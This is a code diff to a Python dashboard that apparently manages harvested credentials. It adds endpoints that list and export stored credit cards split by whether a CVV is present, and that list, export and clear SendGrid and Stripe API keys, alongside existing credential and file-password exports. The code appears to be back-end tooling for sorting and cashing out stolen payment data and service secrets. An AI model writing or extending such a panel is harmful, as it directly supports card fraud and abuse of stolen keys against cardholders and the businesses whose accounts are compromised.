@@ -26,6 +26,7 @@ from telethon.errors import (
 from secure_logging import recent_activity_logs
 from parse_credit_cards import format_credit_card_line
 from parse_passwords import format_password_line
+from parse_api_keys import format_api_key_line
 
 LOG = logging.getLogger('dashboard')
 SESSION_MAX_AGE = 12 * 60 * 60
@@ -556,12 +557,17 @@ class Dashboard:
                             headers={'Content-Disposition': 'attachment; filename=credentials.txt'})
 
         @self.app.get('/credit-cards')
-        async def get_credit_cards(request: Request):
+        async def get_credit_cards(request: Request, limit: int = 1000):
             self._require(request)
-            cards = await asyncio.to_thread(self.db.get_all_credit_cards)
-            for card in cards:
-                card['line'] = format_credit_card_line(card)
-            return cards
+            limit = max(1, min(int(limit), 5000))
+            split = await asyncio.to_thread(self.db.get_credit_cards_split, limit)
+            out = {}
+            for key, include_cvv in (('with_cvv', True), ('without_cvv', False)):
+                cards, total = split[key]
+                for card in cards:
+                    card['line'] = format_credit_card_line(card, include_cvv=include_cvv)
+                out[key] = {'total': total, 'showing': len(cards), 'cards': cards}
+            return out
 
         @self.app.post('/credit-cards/clear-all')
         async def clear_credit_cards(request: Request, csrf: str = Form(...)):
@@ -569,16 +575,71 @@ class Dashboard:
             count = await asyncio.to_thread(self.db.clear_all_credit_cards)
             return RedirectResponse(f'/?notice=Deleted+{count}+credit+cards', 303)
 
-        @self.app.get('/credit-cards/export')
-        async def export_credit_cards(request: Request):
+        @self.app.get('/credit-cards/export-with-cvv')
+        async def export_credit_cards_with_cvv(request: Request):
             self._require(request)
-            cards = await asyncio.to_thread(self.db.get_all_credit_cards)
-            lines = [format_credit_card_line(card) for card in cards]
+            cards = await asyncio.to_thread(lambda: self.db.get_all_credit_cards(with_cvv=True))
+            lines = [format_credit_card_line(card, include_cvv=True) for card in cards]
             content = '\n'.join(lines) + '\n' if lines else ''
             return Response(
                 content,
                 media_type='text/plain',
-                headers={'Content-Disposition': 'attachment; filename=credit-cards.txt'},
+                headers={'Content-Disposition': 'attachment; filename=credit-cards-with-cvv.txt'},
+            )
+
+        @self.app.get('/credit-cards/export-without-cvv')
+        async def export_credit_cards_without_cvv(request: Request):
+            self._require(request)
+            cards = await asyncio.to_thread(lambda: self.db.get_all_credit_cards(with_cvv=False))
+            lines = [format_credit_card_line(card, include_cvv=False) for card in cards]
+            content = '\n'.join(lines) + '\n' if lines else ''
+            return Response(
+                content,
+                media_type='text/plain',
+                headers={'Content-Disposition': 'attachment; filename=credit-cards-without-cvv.txt'},
+            )
+
+        @self.app.get('/api-keys')
+        async def get_api_keys(request: Request, limit: int = 1000):
+            self._require(request)
+            limit = max(1, min(int(limit), 5000))
+            split = await asyncio.to_thread(self.db.get_api_keys_split, limit)
+            out = {}
+            for key in ('sendgrid', 'stripe'):
+                keys, total = split[key]
+                for item in keys:
+                    item['line'] = format_api_key_line(item)
+                out[key] = {'total': total, 'showing': len(keys), 'keys': keys}
+            return out
+
+        @self.app.post('/api-keys/clear-all')
+        async def clear_api_keys(request: Request, csrf: str = Form(...)):
+            self._require_post(request, csrf)
+            count = await asyncio.to_thread(self.db.clear_all_api_keys)
+            return RedirectResponse(f'/?notice=Deleted+{count}+API+keys', 303)
+
+        @self.app.get('/api-keys/export-sendgrid')
+        async def export_api_keys_sendgrid(request: Request):
+            self._require(request)
+            keys = await asyncio.to_thread(lambda: self.db.get_all_api_keys(group='sendgrid'))
+            lines = [format_api_key_line(key) for key in keys]
+            content = '\n'.join(lines) + '\n' if lines else ''
+            return Response(
+                content,
+                media_type='text/plain',
+                headers={'Content-Disposition': 'attachment; filename=sendgrid-keys.txt'},
+            )
+
+        @self.app.get('/api-keys/export-stripe')
+        async def export_api_keys_stripe(request: Request):
+            self._require(request)
+            keys = await asyncio.to_thread(lambda: self.db.get_all_api_keys(group='stripe'))
+            lines = [format_api_key_line(key) for key in keys]
+            content = '\n'.join(lines) + '\n' if lines else ''
+            return Response(
+                content,
+                media_type='text/plain',
+                headers={'Content-Disposition': 'attachment; filename=stripe-keys.txt'},
             )
 
         @self.app.get('/file-passwords')
